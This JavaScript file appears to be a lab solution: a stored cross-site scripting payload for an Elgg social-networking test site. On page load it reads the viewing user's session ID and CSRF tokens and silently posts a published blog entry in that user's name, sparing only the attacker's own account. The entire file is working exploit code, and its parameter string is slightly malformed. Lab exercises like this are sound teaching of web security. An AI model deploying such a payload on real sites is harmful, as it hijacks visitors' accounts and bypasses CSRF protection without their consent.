window.onload = function() {
  var guid = "&guid=&container_guid" + elgg.session.user.guid;
  var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
  var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
  var title = "&title=My Awesome Blog";
  var accesslevel = "&access_id=2";
  var status = "&status=published";
  var save = "&save=Save";
  var description = "&description=My Awesome Blog";
  var content =
    token + ts + title + description + accesslevel + status + guid + save;
  alert(content);
  var aliceGuid = 44;
  var sendurl = "http://www.xsslabelgg.com/action/blog/save";
  if (elgg.session.user.guid != aliceGuid) {
    var Ajax = null;
    Ajax = new XMLHttpRequest();
    Ajax.open("POST", sendurl, true);
    Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
    Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    Ajax.send(content);
  }
};
